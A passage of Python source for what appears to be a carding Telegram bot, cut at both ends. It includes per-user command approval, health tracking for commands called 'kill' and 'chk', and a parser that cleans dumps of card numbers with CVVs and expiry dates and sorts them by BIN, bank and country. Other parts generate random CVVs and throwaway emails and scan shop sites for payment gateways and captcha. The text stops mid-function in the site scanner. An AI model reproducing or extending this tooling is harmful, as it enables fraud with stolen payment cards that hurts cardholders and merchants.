def killer_admin_report(cmd_name: str, trace: str, driver=None):
    """Send error report to admin"""
    BOT_TOKEN = os.environ.get("BOT_TOKEN", "")
    BOT_ADMIN_ID = int(os.environ.get("BOT_ADMIN_ID", "123456789"))
    
    sent = False
    if driver:
        try:
            screenshot_path = f"/tmp/{cmd_name}_fail_{int(time.time())}.png"
            driver.save_screenshot(screenshot_path)
            with open(screenshot_path, "rb") as img:
                requests.post(
                    f"https://api.telegram.org/bot{BOT_TOKEN}/sendPhoto",
                    data={
                        "chat_id": BOT_ADMIN_ID,
                        "caption": f"{cmd_name.upper()} Error:\n```\n{trace[:800]}\n```",
                        "parse_mode": "Markdown"
                    },
                    files={"photo": img},
                    timeout=10
                )
            sent = True
            try:
                os.remove(screenshot_path)
            except:
                pass
        except:
            pass
    
    if not sent:
        try:
            requests.post(
                f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
                data={
                    "chat_id": BOT_ADMIN_ID,
                    "text": f"{cmd_name.upper()} Error:\n```\n{trace[:900]}\n```",
                    "parse_mode": "Markdown"
                },
                timeout=5
            )
        except:
            pass

def killer_cleanup_driver(driver):
    """Clean up driver properly"""
    if driver:
        try:
            driver.quit()
        except:
            pass
    gc.collect()

# ==== 2.3 Browser Command Health Tracking ====
BROWSER_CMDS = ("kill", "kd", "ko", "zz", "dd", "st", "bt", "chk")
_health_lock = threading.Lock()
_health_stats = {cmd: {"success": 0, "failure": 0, "last_status": "idle", "last_time": None} for cmd in BROWSER_CMDS}
_health_repair_threshold = 30  # Auto-repair when health drops below 30%
_health_window = 50  # Track last 50 operations for health calculation

def record_cmd_success(cmd: str):
    """Record a successful command execution"""
    if cmd not in BROWSER_CMDS:
        return
    with _health_lock:
        _health_stats[cmd]["success"] += 1
        _health_stats[cmd]["last_status"] = "success"
        _health_stats[cmd]["last_time"] = datetime.now().isoformat()
        # Check if we need to reset counters (prevent overflow)
        total = _health_stats[cmd]["success"] + _health_stats[cmd]["failure"]
        if total > 1000:
            # Scale down to keep ratios but prevent overflow
            _health_stats[cmd]["success"] = int(_health_stats[cmd]["success"] * 0.5)
            _health_stats[cmd]["failure"] = int(_health_stats[cmd]["failure"] * 0.5)

def record_cmd_failure(cmd: str):
    """Record a failed command execution"""
    if cmd not in BROWSER_CMDS:
        return
    with _health_lock:
        _health_stats[cmd]["failure"] += 1
        _health_stats[cmd]["last_status"] = "failure"
        _health_stats[cmd]["last_time"] = datetime.now().isoformat()
        # Check health and auto-repair if needed
        health = get_cmd_health(cmd)
        if health < _health_repair_threshold and health > 0:
            _trigger_auto_repair(cmd)

def get_cmd_health(cmd: str) -> int:
    """Get health percentage for a command (0-100)"""
    if cmd not in BROWSER_CMDS:
        return 100
    stats = _health_stats[cmd]
    total = stats["success"] + stats["failure"]
    if total == 0:
        return 100  # No data = assume healthy
    return int((stats["success"] / total) * 100)

def get_all_health() -> dict:
    """Get health stats for all browser commands"""
    result = {}
    for cmd in BROWSER_CMDS:
        stats = _health_stats[cmd]
        total = stats["success"] + stats["failure"]
        health = 100 if total == 0 else int((stats["success"] / total) * 100)
        result[cmd] = {
            "health": health,
            "success": stats["success"],
            "failure": stats["failure"],
            "total": total,
            "last_status": stats["last_status"],
            "last_time": stats["last_time"]
        }
    return result

def _trigger_auto_repair(cmd: str):
    """Auto-repair when health is critical"""
    global _health_stats
    # Force garbage collection
    gc.collect()
    # Clear some failure counts to allow recovery
    with _health_lock:
        # Reduce failure count to give command a chance to recover
        if _health_stats[cmd]["failure"] > 5:
            _health_stats[cmd]["failure"] = max(1, int(_health_stats[cmd]["failure"] * 0.3))
        # Log repair action
        print(f"⚕️ Auto-repair triggered for /{cmd} - cleared failure history")

def reset_cmd_health(cmd: str = None):
    """Reset health stats for a command or all commands"""
    global _health_stats
    with _health_lock:
        if cmd and cmd in BROWSER_CMDS:
            _health_stats[cmd] = {"success": 0, "failure": 0, "last_status": "reset", "last_time": datetime.now().isoformat()}
        else:
            for c in BROWSER_CMDS:
                _health_stats[c] = {"success": 0, "failure": 0, "last_status": "reset", "last_time": datetime.now().isoformat()}
    # Force cleanup
    gc.collect()

def get_health_bar(health: int) -> str:
    """Generate a visual health bar"""
    filled = health // 10
    empty = 10 - filled
    if health >= 70:
        color = "🟢"
    elif health >= 40:
        color = "🟡"
    else:
        color = "🔴"
    return f"{color} {'█' * filled}{'░' * empty} {health}%"

# ==== 3. Persistence & Auth Management (Local JSON file) ====
USER_DB_FILE = "users.json"

# Commands we gate
CMD_KEYS = ("bin", "kill", "kd", "ko", "zz", "dd", "st", "bt", "sort", "chk", "clean", "filter", "site")

# Per-command approvals, plus a legacy/global "all" set
approved_cmds = {k: set() for k in CMD_KEYS}
approved_all = set()
banned_users = set()

# Command status (on/off)
cmd_status = {k: True for k in CMD_KEYS}  # True = on, False = off

# Back-compat: keep approved_users (used elsewhere); we'll populate it with global approvals
approved_users = set()  # legacy global (used by old code paths)

def _ensure_admin_seed():
    # Admin always approved for everything
    for k in CMD_KEYS:
        approved_cmds[k].add(BOT_ADMIN_ID)
    approved_all.add(BOT_ADMIN_ID)
    approved_users.add(BOT_ADMIN_ID)

def load_users():
    """Load user data from local file (no Supabase)."""
    _ensure_admin_seed()

    if not os.path.exists(USER_DB_FILE):
        approved_users.clear()
        approved_users.update(approved_all)
        return

    try:
        with open(USER_DB_FILE, "r", encoding="utf-8") as f:
            data = json.load(f) or {}

        per_cmd = data.get("per_cmd")
        if isinstance(per_cmd, dict):
            for k in CMD_KEYS:
                approved_cmds[k].update(per_cmd.get(k, []))

        approved_all.update(data.get("approved_all", []))
        banned_users.update(data.get("banned", []))

        # Back-compat keys from older versions
        if "approved" in data:
            approved_all.update(data.get("approved", []))

        # Only load known command keys (avoid resurrecting removed commands from old DB files)
        if "cmd_status" in data and isinstance(data.get("cmd_status"), dict):
            loaded = data.get("cmd_status", {}) or {}
            for k in CMD_KEYS:
                if k in loaded:
                    cmd_status[k] = bool(loaded.get(k))

        approved_users.clear()
        approved_users.update(approved_all)
        print(f"✅ Loaded {len(approved_all)} approved users, {len(banned_users)} banned users from {USER_DB_FILE}")
    except Exception as e:
        print(f"⚠️ Failed to load {USER_DB_FILE}: {e}")

def save_users():
    """Save user data to local file (no Supabase)."""
    try:
        payload = {
            "per_cmd": {k: sorted(list(v)) for k, v in approved_cmds.items()},
            "approved_all": sorted(list(approved_all)),
            "banned": sorted(list(banned_users)),
            "cmd_status": cmd_status,
        }

        # Atomic-ish write to reduce corruption risk on crash
        tmp_path = f"{USER_DB_FILE}.tmp"
        with open(tmp_path, "w", encoding="utf-8") as f:
            json.dump(payload, f)
        os.replace(tmp_path, USER_DB_FILE)
        print(f"✅ Saved user data to {USER_DB_FILE}")
    except Exception as e:
        print(f"⚠️ Failed to save user data: {e}")

def is_admin(uid): 
    return uid == BOT_ADMIN_ID

def is_approved(uid: int, cmd_key: str) -> bool:
    """Check per-command approval with global fallback and admin override."""
    if uid == BOT_ADMIN_ID:
        return True
    if uid in banned_users:
        return False
    if uid in approved_all:
        return True
    return uid in approved_cmds.get(cmd_key, set())

def is_cmd_enabled(cmd_key: str) -> bool:
    """Check if command is enabled."""
    return cmd_status.get(cmd_key, True)

load_users()

# ==== 4. Utility Functions ====
def format_timedelta(td):
    secs = int(td.total_seconds())
    hrs, rem = divmod(secs, 3600)
    mins, secs = divmod(rem, 60)
    return f"{hrs}h {mins}m {secs}s"

# ==== 4.1 BIN Database & Lookup Functions (local cache) ====
BIN_DB_1 = "bin_database_1.json"
BIN_DB_2 = "bin_database_2.json"
BIN_DB_3 = "bin_database_3.json"  # Local cache for API results
bin_cache = {}

def load_bin_databases():
    """Load BIN databases from local files."""
    global bin_cache
    
    if bin_cache:
        return bin_cache
    
    bin_cache = {}
    
    # Load cached API BINs first (DB3)
    if os.path.exists(BIN_DB_3):
        try:
            with open(BIN_DB_3, "r", encoding="utf-8") as f:
                data = json.load(f)

            if isinstance(data, dict):
                for key, value in data.items():
                    if key and isinstance(value, dict):
                        bin_cache[str(key)[:6].zfill(6)] = value
            elif isinstance(data, list):
                for item in data:
                    if isinstance(item, dict) and item.get("bin"):
                        bin_cache[str(item["bin"])[:6].zfill(6)] = item

            print(f"✅ Loaded cached BINs from {BIN_DB_3}")
        except Exception as e:
            print(f"❌ Error loading {BIN_DB_3}: {e}")
    
    # Load first database
    if os.path.exists(BIN_DB_1):
        try:
            with open(BIN_DB_1, 'r', encoding='utf-8') as f:
                data = json.load(f)
                if isinstance(data, dict):
                    for key, value in data.items():
                        if isinstance(value, dict) and 'data' in value:
                            bin_data = value['data']
                            bin_cache[key] = bin_data
                        else:
                            bin_cache[key] = value
                elif isinstance(data, list):
                    for item in data:
                        if 'bin' in item:
                            bin_cache[item['bin']] = item
            print(f"✅ Loaded BINs from {BIN_DB_1}")
        except Exception as e:
            print(f"❌ Error loading {BIN_DB_1}: {e}")
    
    # Load second database
    if os.path.exists(BIN_DB_2):
        try:
            with open(BIN_DB_2, 'r', encoding='utf-8') as f:
                data = json.load(f)
                if isinstance(data, dict):
                    for key, value in data.items():
                        if key not in bin_cache:
                            if isinstance(value, dict) and 'data' in value:
                                bin_data = value['data']
                                bin_cache[key] = bin_data
                            else:
                                bin_cache[key] = value
                elif isinstance(data, list):
                    for item in data:
                        if 'bin' in item and item['bin'] not in bin_cache:
                            bin_cache[item['bin']] = item
            print(f"✅ Loaded additional BINs from {BIN_DB_2}")
        except Exception as e:
            print(f"❌ Error loading {BIN_DB_2}: {e}")
    
    return bin_cache

def save_bin_to_local_cache(bin_data: dict) -> None:
    """Persist BIN data to local cache file (DB3)."""
    try:
        bin_num = str(bin_data.get("bin", ""))[:6].zfill(6)
        if not bin_num or not bin_num.isdigit() or len(bin_num) != 6:
            return

        payload = {
            "bin": bin_num,
            "brand": (bin_data.get("brand") or "Unknown").upper(),
            "type": (bin_data.get("type") or "Unknown").upper(),
            "country": bin_data.get("country") or "Unknown",
            "country_flag": bin_data.get("country_flag", "") or "",
            "country_code": bin_data.get("country_code", "") or "",
            "bank": bin_data.get("bank") or "Unknown",
            "level": bin_data.get("level", "") or "",
            "source": bin_data.get("source", "api") or "api",
            "updated_at": datetime.now().isoformat(),
        }

        # Keep in-memory cache up to date
        try:
            bin_cache[bin_num] = payload
        except Exception:
            pass

        existing = {}
        if os.path.exists(BIN_DB_3):
            try:
                with open(BIN_DB_3, "r", encoding="utf-8") as f:
                    existing = json.load(f) or {}
            except Exception:
                existing = {}

        if not isinstance(existing, dict):
            existing = {}

        existing[bin_num] = payload

        tmp_path = f"{BIN_DB_3}.tmp"
        with open(tmp_path, "w", encoding="utf-8") as f:
            json.dump(existing, f)
        os.replace(tmp_path, BIN_DB_3)
    except Exception as e:
        print(f"❌ Error saving BIN cache: {e}")

@lru_cache(maxsize=5000)
def _cached_bin_api_lookup(bin_str):
    """Cached API lookup for BINs not in local database"""
    try:
        session = get_http_session()
        res = session.get(f"https://bins.antipublic.cc/bins/{bin_str}", timeout=3)
        if res.status_code == 200:
            return res.json()
    except Exception:
        pass
    return None

def get_bin_info(bin_number):
    """Get BIN info from cache or API with country flag (optimized)"""
    try:
        # Ensure bin_number is 6 digits
        bin_str = str(bin_number)[:6].zfill(6)
        
        # Check cache first
        bin_cache = load_bin_databases()
        if bin_str in bin_cache:
            data = bin_cache[bin_str]
            
            # Get country flag from database
            country_flag = data.get("country_flag", "")
            if not country_flag and 'country' in data:
                # Try to generate flag from country code
                country_code = data.get('country', '').upper()
                if len(country_code) == 2:
                    # Convert country code to flag emoji
                    try:
                        flag_emoji = ''.join(chr(ord(c) + 127397) for c in country_code)
                        country_flag = flag_emoji
                    except:
                        country_flag = ""
            
            # Format the response similar to API
            brand = data.get("brand", data.get("scheme", "Unknown")).upper()
            type_ = data.get("type", "Unknown").upper()
            country = data.get("country_name", data.get("country", "Unknown"))
            country_code = data.get("country_code", data.get("country", ""))
            bank = data.get("bank", data.get("bank_name", "Unknown"))
            level = data.get("level", data.get("card_level", ""))
            
            # Build info string
            info_parts = [brand]
            if type_ and type_ != "UNKNOWN": 
                info_parts.append(type_)
            if country and country != "Unknown":
                info_parts.append(country)
            if level and level != "":
                info_parts.append(level)
            if bank and bank != "Unknown":
                info_parts.append(bank)
                
            return " • ".join(info_parts), {
                "bin": bin_str,
                "brand": brand,
                "type": type_,
                "country": country,
                "country_flag": country_flag,
                "country_code": country_code,
                "bank": bank,
                "level": level,
                "source": "database"
            }
        
        # If not in database, use API (with caching)
        data = _cached_bin_api_lookup(bin_str)
        if data:
            brand = data.get("brand", "Unknown").upper()
            type_ = data.get("type", "Unknown").upper()
            country = data.get("country_name", "Unknown")
            country_code = data.get("country", "")
            
            # Get country flag for API response
            country_flag = ""
            if country_code and len(country_code) == 2:
                try:
                    flag_emoji = ''.join(chr(ord(c) + 127397) for c in country_code.upper())
                    country_flag = flag_emoji
                except:
                    country_flag = ""
            
            bank = data.get("bank", "Unknown")
            level = data.get("level", "")
            
            # Cache the API result locally
            bin_cache[bin_str] = {
                "brand": brand,
                "type": type_,
                "country": country,
                "country_flag": country_flag,
                "country_code": country_code,
                "bank": bank,
                "level": level,
                "source": "api"
            }
            
            # Persist to local cache
            bin_data = {
                "bin": bin_str,
                "brand": brand,
                "type": type_,
                "country": country,
                "country_flag": country_flag,
                "country_code": country_code,
                "bank": bank,
                "level": level,
                "source": "api"
            }
            save_bin_to_local_cache(bin_data)
            
            # Build info string
            info_parts = [brand]
            if type_ and type_ != "UNKNOWN": 
                info_parts.append(type_)
            if country and country != "Unknown":
                info_parts.append(country)
            if level and level != "":
                info_parts.append(level)
            if bank and bank != "Unknown":
                info_parts.append(bank)
                
            return " • ".join(info_parts), {
                "bin": bin_str,
                "brand": brand,
                "type": type_,
                "country": country,
                "country_flag": country_flag,
                "country_code": country_code,
                "bank": bank,
                "level": level,
                "source": "api"
            }
    except Exception as e:
        print(f"BIN lookup error for {bin_number}: {e}")
    
    return "Unavailable", {
        "bin": str(bin_number)[:6],
        "brand": "Unknown",
        "type": "Unknown",
        "country": "Unknown",
        "country_flag": "",
        "country_code": "",
        "bank": "Unknown",
        "level": "",
        "source": "error"
    }

def parse_card_input(text: str):
    text = text.replace(" ", "|").replace("/", "|").replace("\\", "|").replace("\n", "").strip()
    parts = text.split("|")
    if len(parts) != 4:
        return None
    card, mm, yyyy, cvv = parts
    return card, mm.zfill(2), yyyy[-2:], cvv

def extract_card_input(raw_text):
    raw_text = raw_text.replace(" ", "|").replace("/", "|").replace("\\", "|").replace("\n", "").strip()
    matches = re.findall(r"\d{12,19}.\d{1,2}.\d{2,4}.\d{3,4}", raw_text)
    return matches[0] if matches else None

def get_random_cvv(original, used=None):
    # NOTE: don't use a mutable default here; otherwise values leak across calls.
    if used is None:
        used = set()
    while True:
        new = ''.join(random.choices('0123456789', k=3))
        if new != original and new not in used:
            used.add(new)
            return new

def random_email():
    name = ''.join(random.choices(string.ascii_lowercase + string.digits, k=8))
    domains = [
        "gmail.com", "yahoo.com", "outlook.com", "mail.com", "protonmail.com",
        "icloud.com", "aol.com", "gmx.com", "zoho.com", "yandex.com",
        "hotmail.com", "live.com", "msn.com", "tutanota.com", "fastmail.com",
        "pm.me", "inbox.lv", "mail.ru", "mailfence.com", "hushmail.com",
        "posteo.net", "runbox.com", "startmail.com", "email.com", "keemail.me",
        "mailbox.org", "email.cz", "web.de", "t-online.de", "bluewin.ch",
        "seznam.cz", "laposte.net", "orange.fr", "btinternet.com", "sky.com",
        "virginmedia.com", "talktalk.net", "live.co.uk", "mail.co.uk"
    ]
    domain = random.choice(domains)
    return f"{name}@{domain}"

def random_password():
    return ''.join(random.choices(string.ascii_letters + string.digits, k=12))

def extract_bt_cards(text):
    return [line.strip() for line in text.splitlines() if re.search(r'\d{12,19}.*\d{1,2}.*\d{2,4}.*\d{3,4}', line)]

# ==== 4.2 /clean Command Helper Functions (OPTIMIZED for 300MB+ files) ====

def _fast_luhn(card: str) -> bool:
    """Ultra-fast Luhn check - inline for speed"""
    try:
        total = 0
        for i, c in enumerate(reversed(card)):
            d = int(c)
            if i % 2 == 1:
                d *= 2
                if d > 9:
                    d -= 9
            total += d
        return total % 10 == 0
    except:
        return False

def _fast_expiry_check(mm: str, yy: str) -> bool:
    """Fast expiry check - returns True if NOT expired"""
    try:
        month = int(mm)
        year = 2000 + int(yy) if len(yy) == 2 else int(yy)
        now = datetime.now()
        if year > now.year:
            return True
        if year == now.year and month >= now.month:
            return True
        return False
    except:
        return False

def extract_and_clean_cards_fast(data_text: str) -> tuple:
    """
    FAST card extraction for large files (300MB+).
    Returns: (organized_dict, stats_dict)
    - No BIN lookups during parsing (lazy load later)
    - Single regex pass
    - Minimal memory allocation
    """
    start_time = time.time()
    
    if not data_text:
        return {}, {'total_raw': 0, 'valid': 0, 'junk': 0, 'duplicates': 0, 
                   'expired': 0, 'bins_found': 0, 'processing_time': 0}
    
    # Single comprehensive regex pattern
    pattern = re.compile(r'(\d{13,19})[|\s/\\:;,._-]+(\d{1,2})[|\s/\\:;,._-]+(\d{2,4})[|\s/\\:;,._-]+(\d{3,4})')
    
    seen = set()
    cards = []
    by_bin = {}
    by_month = {}
    by_year = {}
    by_year_month = {}  # {year_int: {month: [cards]}}
    
    stats = {'total_raw': 0, 'valid': 0, 'junk': 0, 'duplicates': 0, 'expired': 0}
    
    # Process in chunks for memory efficiency
    chunk_size = 1024 * 1024  # 1MB chunks
    pos = 0
    text_len = len(data_text)
    
    while pos < text_len:
        # Get chunk with overlap to avoid splitting cards
        end = min(pos + chunk_size, text_len)
        if end < text_len:
            # Extend to next newline to avoid splitting
            newline_pos = data_text.find('\n', end)
            if newline_pos != -1 and newline_pos < end + 1000:
                end = newline_pos + 1
        
        chunk = data_text[pos:end]
        pos = end
        
        for match in pattern.finditer(chunk):
            stats['total_raw'] += 1
            cc, mm, yy, cvv = match.groups()
            
            # Quick validations
            mm = mm.zfill(2)
            if not (1 <= int(mm) <= 12):
                stats['junk'] += 1
                continue
            
            yy = yy[-2:] if len(yy) == 4 else yy.zfill(2)
            
            if len(cvv) < 3:
                stats['junk'] += 1
                continue
            
            # Luhn check
            if not _fast_luhn(cc):
                stats['junk'] += 1
                continue
            
            # Expiry check
            if not _fast_expiry_check(mm, yy):
                stats['expired'] += 1
                continue
            
            # Dedup
            key = f"{cc}|{mm}|{yy}|{cvv}"
            if key in seen:
                stats['duplicates'] += 1
                continue
            seen.add(key)
            
            # Store minimal card data
            bin_num = cc[:6]
            full_year = 2000 + int(yy)
            
            card_data = {
                'card': cc,
                'mm': mm,
                'yy': yy,
                'cvv': cvv,
                'formatted': key,
                'bin': bin_num,
                'full_year': full_year
            }
            
            cards.append(card_data)
            
            # Organize by BIN
            if bin_num not in by_bin:
                by_bin[bin_num] = []
            by_bin[bin_num].append(card_data)
            
            # Organize by month
            if mm not in by_month:
                by_month[mm] = []
            by_month[mm].append(card_data)
            
            # Organize by year
            if yy not in by_year:
                by_year[yy] = []
            by_year[yy].append(card_data)
            
            # Organize by year_month
            if full_year not in by_year_month:
                by_year_month[full_year] = {}
            if mm not in by_year_month[full_year]:
                by_year_month[full_year][mm] = []
            by_year_month[full_year][mm].append(card_data)
    
    stats['valid'] = len(cards)
    stats['bins_found'] = len(by_bin)
    stats['processing_time'] = time.time() - start_time
    
    organized = {
        'all': cards,
        'by_bin': by_bin,
        'by_month': by_month,
        'by_year': by_year,
        'by_year_month': by_year_month,
        'by_brand': {},
        'by_type': {},
        'by_level': {},
        'by_country': {},
        'by_bank': {},
        'by_expiry_month': by_month,  # Alias for compatibility
        '_bin_info_loaded': False
    }
    
    # Add stats
    stats['years_found'] = len(by_year)
    stats['months_found'] = len(by_month)
    stats['types_found'] = 0
    stats['levels_found'] = 0
    stats['brands_found'] = 0
    stats['countries_found'] = 0
    stats['banks_found'] = 0
    
    return organized, stats

def _load_clean_bin_details(organized: dict, stats: dict) -> None:
    """Lazy load BIN details for /clean (brand, type, level, country, bank)"""
    if organized.get('_bin_info_loaded'):
        return
    
    # Sort BINs by count and limit for speed
    sorted_bins = sorted(organized['by_bin'].items(), key=lambda x: -len(x[1]))[:150]
    
    for bin_num, cards_list in sorted_bins:
        try:
            info_str, details = get_bin_info(bin_num)
            if not details:
                continue
            
            # Update each card with BIN info
            for card in cards_list:
                card['bin_info'] = info_str
                card['brand'] = details.get('brand', 'Unknown')
                card['type'] = details.get('type', 'Unknown')
                card['level'] = details.get('level', '')
                card['country'] = details.get('country', 'Unknown')
                card['country_flag'] = details.get('country_flag', '')
                card['bank'] = details.get('bank', 'Unknown')
            
            # Organize by brand
            brand = (details.get('brand') or '').upper()
            if brand and brand != 'UNKNOWN':
                if brand not in organized['by_brand']:
                    organized['by_brand'][brand] = []
                organized['by_brand'][brand].extend(cards_list)
            
            # Organize by type
            card_type = (details.get('type') or '').upper()
            if card_type and card_type != 'UNKNOWN':
                if card_type not in organized['by_type']:
                    organized['by_type'][card_type] = []
                organized['by_type'][card_type].extend(cards_list)
            
            # Organize by level
            level = (details.get('level') or '').upper()
            if level:
                if level not in organized['by_level']:
                    organized['by_level'][level] = []
                organized['by_level'][level].extend(cards_list)
            
            # Organize by country
            country = details.get('country') or ''
            flag = details.get('country_flag') or ''
            if country:
                country_key = f"{flag} {country}" if flag else country
                if country_key not in organized['by_country']:
                    organized['by_country'][country_key] = []
                organized['by_country'][country_key].extend(cards_list)
            
            # Organize by bank
            bank = details.get('bank') or ''
            if bank and bank != 'Unknown':
                if bank not in organized['by_bank']:
                    organized['by_bank'][bank] = []
                organized['by_bank'][bank].extend(cards_list)
        except:
            continue
    
    # Update stats
    stats['brands_found'] = len(organized['by_brand'])
    stats['types_found'] = len(organized['by_type'])
    stats['levels_found'] = len(organized['by_level'])
    stats['countries_found'] = len(organized['by_country'])
    stats['banks_found'] = len(organized['by_bank'])
    
    organized['_bin_info_loaded'] = True

# Legacy compatibility functions
def is_card_expired(mm, yy):
    """Check if card is expired (MM/YY format) - legacy wrapper"""
    return not _fast_expiry_check(mm, yy)

def luhn_check(card_number):
    """Validate card number using Luhn algorithm - legacy wrapper"""
    return _fast_luhn(str(card_number).replace(" ", "").replace("-", ""))

def extract_and_clean_cards_advanced(data_text):
    """
    OPTIMIZED card extraction - wrapper around fast function.
    Handles 300MB+ files with lazy BIN loading.
    Returns tuple: (valid_cards_dict, stats_dict)
    """
    if not data_text or not isinstance(data_text, str):
        return {}, {
            'total_raw': 0, 'valid': 0, 'junk': 0, 'duplicates': 0,
            'expired': 0, 'bins_found': 0, 'processing_time': 0
        }
    
    # Use fast extraction
    organized, stats = extract_and_clean_cards_fast(data_text)
    
    # Map new structure to legacy structure for backward compatibility
    organized['all_cards'] = organized.get('all', [])
    organized['by_expiry_year'] = {}
    for yy, cards in organized.get('by_year', {}).items():
        full_year = 2000 + int(yy) if len(yy) == 2 else int(yy)
        organized['by_expiry_year'][full_year] = cards
    
    return organized, stats

async def download_file_content(file):
    """Download and decode file content"""
    try:
        file_bytes = await file.download_as_bytearray()
        
        # Try different encodings
        encodings = ['utf-8', 'latin-1', 'cp1252', 'iso-8859-1']
        
        for encoding in encodings:
            try:
                return file_bytes.decode(encoding)
            except UnicodeDecodeError:
                continue
        
        # If all encodings fail, try with errors ignored
        return file_bytes.decode('utf-8', errors='ignore')
    except Exception as e:
        print(f"Error downloading file: {e}")
        return ""

def get_top_countries(by_country, limit=3):
    """Get top countries by card count"""
    country_counts = [(country, len(cards)) for country, cards in by_country.items()]
    country_counts.sort(key=lambda x: x[1], reverse=True)
    return country_counts[:limit]

# ==== 4.3 Removed Commands: /num and /adhar ====
# These commands were deprecated and fully removed.

# ==== 4.35 /site Command - Website Gateway & Captcha Analyzer ====
def _analyze_site(url: str, session: requests.Session = None) -> dict:
    """
    Analyze a website for payment gateways, captcha, platform, etc.
    Returns a dict with all detected information.
    """
    from urllib.parse import urljoin, urlparse
    
    result = {
        "url": url,
        "status": "error",
        "status_code": None,
        "platform": [],
        "gateways": [],
        "captcha": [],
        "cloudflare": False,
        "checkout_page": False,
        "payment_page": False,
        "checkout_links": [],
        "payment_links": [],
        "ssl": False,
        "error": None,
    }
    
    # Normalize URL (keep path/query; gateway is often only detectable on checkout/payment URLs)
    url = (url or "").strip()
    if not url:
        result["error"] = "Empty URL"
        return result

    if not url.startswith(("http://", "https://")):
        url = "https://" + url

    result["url"] = url
    result["ssl"] = url.startswith("https://")
    
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.5",
    }
    
    # Use provided session or create new one
    http = session or requests.Session()
    
    def _is_soft_404(text_lower: str) -> bool:
        if not text_lower:
            return False
        # Conservative: only treat explicit 404 pages as missing.
        if "<title>404" in text_lower:
            return True
        if "404" in text_lower and ("page not found" in text_lower or "not found" in text_lower):
            return True
        return False

    def _head_allows(url_to_check: str) -> Optional[bool]:
        """
        True  => exists (2xx/3xx or 401/403)
        False => does not exist (404/410 or other hard failure)
        None  => HEAD not allowed / inconclusive
        """
        try:
            r = http.head(url_to_check, headers=headers, timeout=8, allow_redirects=True)
            if r.status_code == 405:
                return None
            if r.status_code in (404, 410):
                return False
            if r.status_code in (401, 403):
                return True
            return 200 <= r.status_code < 400
        except Exception:
            return None

    try:
        # Try the provided URL first; if https fails, fallback to http.
        resp = None
        try:
            resp = http.get(url, headers=headers, timeout=15, allow_redirects=True)
        except requests.exceptions.SSLError:
            if url.startswith("https://"):
                url = "http://" + url[len("https://") :]
                result["url"] = url
                result["ssl"] = False
                resp = http.get(url, headers=headers, timeout=15, allow_redirects=True)
            else:
                raise
        except requests.exceptions.ConnectionError:
            if url.startswith("https://"):
                url = "http://" + url[len("https://") :]
                result["url"] = url
                result["ssl"] = False
                resp = http.get(url, headers=headers, timeout=15, allow_redirects=True)
            else:
                raise

        result["status_code"] = resp.status_code
        
        # Accept any 2xx or 3xx status
        if 200 <= resp.status_code < 400:
            result["status"] = "success"
        else:
            result["status"] = "partial"
        
        html = (resp.text or "").lower()
        original_html = resp.text or ""
        base_url = f"{urlparse(resp.url).scheme}://{urlparse(resp.url).netloc}"

        # Handle "soft 404" pages that respond 200
        if resp.status_code == 200 and _is_soft_404(html):
            result["status"] = "partial"
        
        # ============ PAYMENT GATEWAYS ============
        gateway_patterns = {
            "Stripe": ["stripe.com", "js.stripe.com", "stripe.js", "pk_live_", "pk_test_", "stripe-checkout"],
            "Braintree": ["braintree", "braintreegateway", "braintree-web", "hosted-fields"],
            "PayPal": ["paypal.com", "paypalobjects.com", "paypal-sdk", "paypal-buttons"],
            "Square": ["squareup.com", "square.js", "squarecdn.com", "sq-payment-form"],
            "Authorize.net": ["authorize.net", "authorizenet", "accept.js", "acceptjs"],
            "Adyen": ["adyen.com", "adyencheckout", "adyen-checkout", "checkoutshopper"],
            "Worldpay": ["worldpay.com", "worldpay.js", "worldpayonline"],
            "Klarna": ["klarna.com", "klarnacdn", "klarna-checkout"],
            "Razorpay": ["razorpay.com", "razorpay.js", "checkout.razorpay"],
            "PayU": ["payu", "payumoney", "secure.payu", "checkout.payu"],
            "Cashfree": ["cashfree", "cashfreepayments", "api.cashfree", "sdk.cashfree"],
            "Paytm": ["paytm", "securegw.paytm", "checkout.paytm"],
            "PhonePe": ["phonepe", "api.phonepe", "checkout.phonepe"],
            "CCAvenue": ["ccavenue", "secure.ccavenue", "ccavenue.com"],
            "Instamojo": ["instamojo", "js.instamojo", "api.instamojo"],
            "2Checkout": ["2checkout.com", "2co.com", "2checkout-inline"],
            "Mollie": ["mollie.com", "mollie.js", "molliepayments"],
            "Shopify Pay": ["shop.app", "shopifypay", "checkout.shopify"],
            "WC Payments": ["woocommerce-payments", "wc-payments", "wcpay"],
            "CyberSource": ["cybersource.com", "cybersource.js", "flex-v2"],
            "NMI": ["collectjs", "collect.js"],
            "Checkout.com": ["checkout.com", "cko-", "frames.js"],
        }

        def _detect_gateways(text_lower: str) -> Set[str]:
            found: Set[str] = set()
            if not text_lower:
                return found
            for gateway, patterns in gateway_patterns.items():
                if any(p in text_lower for p in patterns):
                    found.add(gateway)
            return found

        gateways_found = _detect_gateways(html)
        result["gateways"] = sorted(gateways_found)
        
        # ============ CAPTCHA DETECTION ============
        captcha_patterns = {
            "reCAPTCHA v2": ["g-recaptcha", "recaptcha/api.js", "data-sitekey"],
            "reCAPTCHA v3": ["recaptcha/api.js?render=", "grecaptcha.execute"],
            "hCaptcha": ["hcaptcha.com", "h-captcha"],
            "Turnstile": ["turnstile", "cf-turnstile", "challenges.cloudflare.com/turnstile"],
            "Arkose": ["funcaptcha", "arkoselabs"],
            "GeeTest": ["geetest", "initgeetest"],
        }
        
        for captcha, patterns in captcha_patterns.items():
            if any(p in html for p in patterns):
                result["captcha"].append(captcha)
        
        # ============ PLATFORM DETECTION ============
        platform_patterns = {
            "Shopify": ["cdn.shopify", "myshopify.com", "shopify-section"],
            "WooCommerce": ["woocommerce", "wc-ajax", "woocommerce-page"],
            "Magento": ["magento", "mage/", "magentocommerce"],
            "BigCommerce": ["bigcommerce", "bccdn.net"],
            "PrestaShop": ["prestashop"],
            "OpenCart": ["opencart", "catalog/view"],
            "Squarespace": ["squarespace.com", "static.squarespace"],
            "Wix": ["wix.com", "parastorage.com"],
            "WordPress": ["wp-content", "wp-includes"],
        }
        
        for platform, patterns in platform_patterns.items():
            if any(p in html for p in patterns):
                result["platform"].append(platform)
        
        # ============ CLOUDFLARE DETECTION ============
        cf_headers = str(resp.headers).lower()
        if any(s in html or s in cf_headers for s in ["cloudflare", "cf-ray", "cdn-cgi"]):
